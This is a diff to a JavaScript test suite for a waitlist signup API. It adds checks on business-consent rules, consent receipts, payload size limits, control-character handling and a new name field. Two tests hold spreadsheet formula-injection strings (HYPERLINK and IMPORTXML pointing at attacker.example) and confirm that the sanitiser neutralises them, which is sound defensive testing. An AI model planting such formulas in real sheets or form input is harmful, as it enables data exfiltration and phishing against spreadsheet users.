@@ -28,6 +28,8 @@ delete process.env.UPSTASH_REDIS_REST_URL;
 // it pins the lie in place. Shape adopted from the merge session's harness,
 // which caught it.
 let stubRows = 137;
+/** Every payload the endpoint has forwarded upstream, newest last. */
+const stubForwarded = [];
 const stub = http.createServer((req, res) => {
   let body = '';
   req.on('data', (c) => (body += c));
@@ -39,6 +41,7 @@ const stub = http.createServer((req, res) => {
       /* malformed — still answer, the endpoint only reads `count` */
     }
     if (payload.action !== 'confirm') stubRows += 1;
+    stubForwarded.push(payload);
     res.setHeader('Content-Type', 'application/json');
     res.end(JSON.stringify({ ok: true, count: stubRows }));
   });
@@ -69,6 +72,17 @@ let ipCounter = 0;
 function freshIp() {
   ipCounter += 1;
   return `198.51.100.${ipCounter % 250}`;
+}
+
+/**
+ * POST, then return the row the endpoint actually FORWARDED — not the row the
+ * test author believes it forwards. Same reasoning as the sheet suite's
+ * Scenario S: the gap between those two is where sms_phone was dropped.
+ */
+async function postCapturing(body, opts = {}) {
+  const before = stubForwarded.length;
+  const res = await post(body, opts);
+  return { ...res, captured: stubForwarded.slice(before) };
 }
 
 async function post(body, { ip = freshIp(), contentType = 'application/json', method = 'POST', raw = null, headers = {} } = {}) {
@@ -920,6 +934,7 @@ await check('Error response never echoes submitted input', 'no email in body', a
     channel_other: null,
     office_interest: 'maybe',
     company: 'Acme AS',
+    name: 'Sarah',
     headcount: '10_49',
     research_optin: true,
     consent_sms: true,
@@ -1139,6 +1154,229 @@ await check('Error response never echoes submitted input', 'no email in body', a
     return { pass: v.ok && stored === null, actual: JSON.stringify(stored) };
   });
 
+  // ── S22: role addresses behind the business basis ───────────────────────
+  const BIZ = '2026-08-19.business.a';
+
+  await check('office@ still rejected without the business basis', 'role_address', async () => {
+    const v = validateWaitlist(growthPayload({ email: 'office@bakeriet.no' }));
+    const i = v.ok ? null : v.issues.find((x) => x.path === 'email');
+    return { pass: !v.ok && i?.rule === 'role_address', actual: v.ok ? 'ACCEPTED' : JSON.stringify(i) };
+  });
+
+  await check('business_enquiry WITHOUT wording is refused', 'omits_business', async () => {
+    // Declaring the basis is not showing it. A boolean proves only that
+    // somebody sent a boolean.
+    const v = validateWaitlist(growthPayload({ email: 'office@bakeriet.no', business_enquiry: true }));
+    const i = v.ok ? null : v.issues.find((x) => x.path === 'business_consent_text_version');
+    return { pass: !v.ok && i?.rule === 'consent_wording_omits_business', actual: v.ok ? 'ACCEPTED' : JSON.stringify(i) };
+  });
+
+  await check('business_enquiry with the WRONG wording is refused', 'omits_business', async () => {
+    const v = validateWaitlist(growthPayload({ email: 'office@bakeriet.no', business_enquiry: true, business_consent_text_version: '2026-08-15.marketing.a' }));
+    return { pass: !v.ok, actual: v.ok ? 'ACCEPTED — marketing wording passed as business' : 'rejected' };
+  });
+
+  await check('office@ accepted with the registered business wording', 'accepted', async () => {
+    const v = validateWaitlist(growthPayload({ email: 'office@bakeriet.no', business_enquiry: true, business_consent_text_version: BIZ }));
+    return { pass: v.ok, actual: v.ok ? 'ACCEPTED' : JSON.stringify(v.issues) };
+  });
+
+  await check('a DISPOSABLE domain is still refused, business basis or not', 'disposable', async () => {
+    // A throwaway domain is not a workplace and the basis does not make it one.
+    const v = validateWaitlist(growthPayload({ email: 'office@mailinator.com', business_enquiry: true, business_consent_text_version: BIZ }));
+    const i = v.ok ? null : v.issues.find((x) => x.path === 'email');
+    return { pass: !v.ok && i?.rule === 'disposable', actual: v.ok ? 'ACCEPTED' : JSON.stringify(i) };
+  });
+
+  // THE PROMISE. Everything above is access control; this is the sentence we
+  // showed the person. If a business row can reach a send list filtered on
+  // consent_marketing = TRUE, the wording we displayed was false.
+  await check('THE PROMISE: a business row stores consent_marketing FALSE', 'excluded structurally', async () => {
+    const { captured } = await postCapturing(growthPayload({
+      email: 'office@bakeriet.no', business_enquiry: true, business_consent_text_version: BIZ,
+    }));
+    const row = captured[0] ?? {};
+    return {
+      pass: row.consent_marketing === false && row.business_enquiry === true,
+      actual: `consent_marketing=${row.consent_marketing} business_enquiry=${row.business_enquiry}`,
+    };
+  });
+
+  await check('a normal signup is untouched by any of it', 'marketing TRUE', async () => {
+    const { captured } = await postCapturing(growthPayload());
+    const row = captured[0] ?? {};
+    return {
+      pass: row.consent_marketing === true && row.business_enquiry === false,
+      actual: `consent_marketing=${row.consent_marketing} business_enquiry=${row.business_enquiry}`,
+    };
+  });
+
+  await check('receipt v4 records the business block and the suppression', 'both present', async () => {
+    const { captured } = await postCapturing(growthPayload({
+      email: 'office@bakeriet.no', business_enquiry: true, business_consent_text_version: BIZ,
+    }));
+    const r = JSON.parse(captured[0]?.consent_receipt ?? '{}');
+    const ok = r.schema === 'zuca.consent.v4'
+      && r.business?.granted === true
+      && typeof r.business?.text === 'string' && r.business.text.includes('on behalf of')
+      && r.personal_marketing_suppressed === true
+      && r.marketing?.granted === false;
+    return { pass: ok, actual: `schema=${r.schema} biz=${r.business?.granted} sup=${r.personal_marketing_suppressed} mkt=${r.marketing?.granted}` };
+  });
+
+  // ── The size cap must not reject what the schema accepts ────────────────
+  // MAX_BODY_BYTES carried the comment "the largest legitimate payload is well
+  // under 1 KB". That was true when it was written and the 2026-08-17 extension
+  // tripled the field count without anyone re-measuring. A derived number
+  // maintained by hand, exactly like the runbook's column letters.
+  //
+  // It is dangerous in a specific way: the stale figure INVITES a tightening.
+  // Someone reads "well under 1 KB", sets the cap to 2 KB "with generous
+  // margin", and starts 413ing real submissions from people who filled the form
+  // in properly. So this measures instead of asserting, and prints the margin.
+  await check('a maximal VALID payload fits the size cap', 'fits with margin', async () => {
+    const { MAX_BODY_BYTES, MOTIVATIONS, DIETARY, CHANNELS } = await import('../src/lib/validation.js');
+    const x = (n) => 'x'.repeat(n);
+    const max = {
+      email: `${x(60)}@${x(50)}.com`,
+      consent_marketing: true, consent_health: true, consent_sms: true, consent_postal: true,
+      research_optin: true, is_clinician: true,
+      name: x(40), company: x(80),
+      zip: '12345', intent: 'preorder_now', flavor: 'both',
+      price_band: 'other', price_band_other: x(40),
+      referral_source: 'other', referral_source_other: x(120),
+      motivation: MOTIVATIONS, motivation_other: x(60),
+      // Must be a REGISTERED version whose wording names medication, because
+      // MOTIVATIONS includes glp1_medication and superRefine gates it on the
+      // verbatim text. A 64-x filler would 400 — which it did on the first run
+      // of this test, correctly. It is 30 chars, so the true maximum is very
+      // slightly smaller than a naive all-fields-at-cap estimate.
+      motivation_consent_text_version: '2026-08-19.health-medication.a',
+      dietary: DIETARY, dietary_other: x(60),
+      channel: CHANNELS, channel_other: x(120),
+      quantity_band: 'srv_3_5', office_interest: 'yes', headcount: '10_49',
+      phone: '+4799999999',
+      address_line1: x(120), address_line2: x(120), address_city: x(80),
+      address_region: x(80), address_postal_code: '0150', address_country: 'NO',
+      consent_text_version: x(64),
+      sms_consent_text_version: x(64), postal_consent_text_version: x(64),
+      page_path: x(200), hp_field: null, form_render_ts: Date.now() - 9000,
+      utm: { source: x(64), medium: x(64), campaign: x(64), content: x(64), term: x(64) },
+    };
+    const v = validateWaitlist(max);
+    const bytes = Buffer.byteLength(JSON.stringify(max), 'utf8');
+    // Both halves matter. If the schema rejects it the measurement is of
+    // something no user can send, and the test would quietly stop meaning
+    // anything while still passing.
+    return {
+      pass: v.ok && bytes < MAX_BODY_BYTES,
+      actual: `${bytes}B vs ${MAX_BODY_BYTES}B cap (${(MAX_BODY_BYTES / bytes).toFixed(1)}x margin), schema ${v.ok ? 'accepts' : 'REJECTS: ' + JSON.stringify(v.issues.slice(0, 3))}`,
+    };
+  });
+
+  // ── The response contract: nine statuses, and NO field names ────────────
+  // I told Conversion the per-field `rule` was in the 400 body. It is not — it
+  // goes to the audit log. They found that by reading api/waitlist.js instead of
+  // believing me. These pin both halves so the next person gets it from a test.
+
+  await check('400 body carries no field names or rule strings', 'error only', async () => {
+    const r = await post(growthPayload({ name: 'x'.repeat(41) }));
+    const keys = Object.keys(r.json ?? {}).sort().join(',');
+    return { pass: r.status === 400 && keys === 'error,ok', actual: `${r.status} ${JSON.stringify(r.json)}` };
+  });
+
+  await check('415 is a DISTINCT status, not a 400', 'not validation', async () => {
+    // navigator.sendBeacon posts text/plain. An offline queue flushed with it
+    // lands here, and a client that only handles 400 sees an unhandled status.
+    const r = await post(growthPayload(), { headers: { 'Content-Type': 'text/plain' } });
+    return { pass: r.status === 415, actual: `${r.status} ${JSON.stringify(r.json)}` };
+  });
+
+  // ── C0/C1 control characters: STRIPPED, not rejected (S21) ──────────────
+  // Conversion shipped the same strip client-side FIRST, because this is a
+  // REMOVE-class change. These assertions exist in two halves and the second
+  // half is the important one: it pins that CR, LF, NUL and bidi overrides are
+  // STILL a hard rejection. Widening a strip over them would silently downgrade
+  // a security control into a cleanup, and every other test here would keep
+  // passing while it happened.
+
+  for (const [label, code] of [['BEL', 7], ['DEL', 127], ['C1', 0x9b], ['SOH', 1]])
+    await check(`${label} in a free-text field is stripped`, 'Sarah', async () => {
+      const v = validateWaitlist(growthPayload({ name: 'Sar' + String.fromCharCode(code) + 'ah' }));
+      return { pass: v.ok && v.data.name === 'Sarah', actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
+    });
+
+  await check('stripping does not leave a double space', 'Anne Marie', async () => {
+    // Strip runs BEFORE normalizeText so the collapse and trim clean up after
+    // it. Strip afterwards and this returns "Anne  Marie".
+    const v = validateWaitlist(growthPayload({ name: 'Anne ' + String.fromCharCode(7) + ' Marie' }));
+    return { pass: v.ok && v.data.name === 'Anne Marie', actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
+  });
+
+  await check('a control-only value becomes null, not an empty cell', 'null', async () => {
+    const v = validateWaitlist(growthPayload({ name: String.fromCharCode(7, 7) }));
+    return { pass: v.ok && v.data.name === null, actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
+  });
+
+  for (const [label, code] of [['CR', 13], ['LF', 10], ['NUL', 0], ['bidi override', 0x202e]])
+    await check(`${label} is STILL rejected, not swept into the strip`, 'illegal_chars', async () => {
+      const v = validateWaitlist(growthPayload({ name: 'Sar' + String.fromCharCode(code) + 'ah' }));
+      const issue = v.ok ? null : v.issues.find((i) => i.path === 'name');
+      return { pass: !v.ok && issue?.rule === 'illegal_chars', actual: v.ok ? 'ACCEPTED — CONTROL DOWNGRADED' : JSON.stringify(issue) };
+    });
+
+  await check('email is NOT silently repaired by the strip', 'invalid_email', async () => {
+    // safeString only. Stripping inside the shared normalizeText would have
+    // turned "a<BEL>@b.com" into a DIFFERENT, valid address and sent mail to it
+    // — accuracy, Art 5(1)(d). An identifier is not a cosmetic field.
+    const v = validateWaitlist(growthPayload({ email: 'a' + String.fromCharCode(7) + '@b.com' }));
+    const issue = v.ok ? null : v.issues.find((i) => i.path === 'email');
+    return { pass: !v.ok && issue?.rule === 'invalid_email', actual: v.ok ? `ACCEPTED as ${v.data.email}` : JSON.stringify(issue) };
+  });
+
+  // ── name: optional first name, added 2026-08-19 ─────────────────────────
+  // Maps onto the legacy `Name` column. Before this it was in Code.gs COLUMNS
+  // but NOT in the schema, so a client sending it got a 400 on unrecognized_keys
+  // and the downgrade ladder stripped it — the name lost silently while every
+  // save cost two round trips. A column with no schema entry, which is the exact
+  // mirror of price_band_other having a schema entry with no column.
+
+  await check('name accepted', 'stored', async () => {
+    const v = validateWaitlist(growthPayload({ name: 'Sarah' }));
+    return { pass: v.ok && v.data.name === 'Sarah', actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
+  });
+
+  await check('name is optional — omitting it is not an error', 'null', async () => {
+    const p = growthPayload(); delete p.name;
+    const v = validateWaitlist(p);
+    return { pass: v.ok && v.data.name === null, actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
+  });
+
+  await check('name at the 40 cap accepted', '40 chars ok', async () => {
+    const v = validateWaitlist(growthPayload({ name: 'x'.repeat(40) }));
+    return { pass: v.ok && v.data.name.length === 40, actual: v.ok ? String(v.data.name.length) : 'rejected' };
+  });
+
+  await check('name at 41 rejected — cap is EQUAL to the client cap', 'too_long', async () => {
+    // Equal, not merely "each reasonable". A client cap above the server cap
+    // turns the gap into a 400 nobody sees in either codebase on its own.
+    const v = validateWaitlist(growthPayload({ name: 'x'.repeat(41) }));
+    const issue = v.ok ? null : v.issues.find((i) => i.path === 'name');
+    return { pass: !v.ok && issue?.rule === 'too_long', actual: v.ok ? 'ACCEPTED' : JSON.stringify(issue) };
+  });
+
+  await check('name with a formula is neutralised before the sheet', "prefixed with '", async () => {
+    const out = sanitizeForSheet('=HYPERLINK("https://attacker.example","hi")');
+    return { pass: out.startsWith("'"), actual: out.slice(0, 28) + '…' };
+  });
+
+  await check('name survives with no health consent — it is not Art 9', 'stored', async () => {
+    // Distinct from motivation/dietary. A first name is ordinary contact data,
+    // so it must NOT be caught by the Art 9 gate.
+    const v = validateWaitlist(growthPayload({ name: 'Sarah', consent_health: false, motivation: null, motivation_consent_text_version: null, dietary: null }));
+    return { pass: v.ok && v.data.name === 'Sarah', actual: JSON.stringify(v.ok ? v.data.name : v.issues) };
+  });
+
   await check('Formula payload in company neutralised', "prefixed with '", async () => {
     const out = sanitizeForSheet('=IMPORTXML("https://attacker.example","//a")');
     return { pass: out.startsWith("'"), actual: out.slice(0, 30) + '…' };
@@ -1153,17 +1391,47 @@ await check('Error response never echoes submitted input', 'no email in body', a
     return { pass: ok, actual: JSON.stringify(b) };
   });
 
-  await check('Receipt block names match the field names they document', 'no mixed vocabulary', async () => {
+  await check('Receipt block names match the fields they document', 'no mixed vocabulary', async () => {
     // `mail` vs `postal` in one document cost two people an hour between them.
-    // Asserting the relationship rather than the literal, so a future rename
-    // that moves one and not the other fails here.
+    // This caught the S22 restructure immediately, which is the whole point —
+    // two of the five blocks stopped following the `data.consent_X` shape and
+    // it noticed rather than shrugging.
+    //
+    // The exceptions are now declared rather than pattern-matched away:
+    //   marketing  reads `holdsPersonalMarketingConsent`, the single derivation
+    //              that also feeds the stored column and the audit log. It must
+    //              NOT read data.consent_marketing again — that is exactly the
+    //              divergence that made the receipt contradict the sheet.
+    //   business   reads `data.business_enquiry`; there is no consent_business
+    //              flag, the enquiry declaration IS the flag.
+    const { CONSENT_PURPOSES } = await import('../src/lib/validation.js');
+    // purpose key -> receipt block name. `mail` differs on purpose and is
+    // documented at the receipt; everything else is identity.
+    const BLOCK_FOR_PURPOSE = { marketing: 'marketing', health: 'health', sms: 'sms', mail: 'postal', business: 'business' };
+    const EXPECTED_EXPR = { marketing: 'holdsPersonalMarketingConsent', business: 'data.business_enquiry' };
+
     const src = (await import('node:fs')).readFileSync(new URL('../api/waitlist.js', import.meta.url), 'utf8');
-    const blocks = [...src.matchAll(/\['(\w+)', data\.consent_(\w+),/g)].map((m) => [m[1], m[2]]);
-    const mismatched = blocks.filter(([block, field]) => block !== field);
-    return {
-      pass: blocks.length === 4 && mismatched.length === 0,
-      actual: mismatched.length ? `block "${mismatched[0][0]}" documents consent_${mismatched[0][1]}` : `${blocks.length} blocks, all aligned`,
-    };
+    const table = src.slice(src.indexOf('consent_receipt: JSON.stringify('));
+    const blocks = [...table.matchAll(/\['(\w+)', ([\w.]+),/g)].map((m) => [m[1], m[2]]);
+
+    const problems = [];
+    // A purpose added without a block here fails, rather than silently
+    // producing a receipt that omits a consent we took.
+    const declared = Object.keys(CONSENT_PURPOSES).sort().join(',');
+    if (declared !== Object.keys(BLOCK_FOR_PURPOSE).sort().join(',')) {
+      problems.push(`CONSENT_PURPOSES is ${declared} — update BLOCK_FOR_PURPOSE`);
+    }
+    const found = blocks.map(([b]) => b).sort().join(',');
+    const want = Object.values(BLOCK_FOR_PURPOSE).sort().join(',');
+    if (found !== want) problems.push(`receipt has ${found}, expected ${want}`);
+
+    for (const [purpose, block] of Object.entries(BLOCK_FOR_PURPOSE)) {
+      const entry = blocks.find(([b]) => b === block);
+      if (!entry) continue;
+      const expected = EXPECTED_EXPR[purpose] ?? `data.consent_${block}`;
+      if (entry[1] !== expected) problems.push(`block "${block}" reads ${entry[1]}, expected ${expected}`);
+    }
+    return { pass: problems.length === 0, actual: problems.length ? problems.join(' · ') : `${blocks.length} blocks, all aligned` };
   });
 
   await check('Server-derived fields still rejected from the client', '400', async () => {
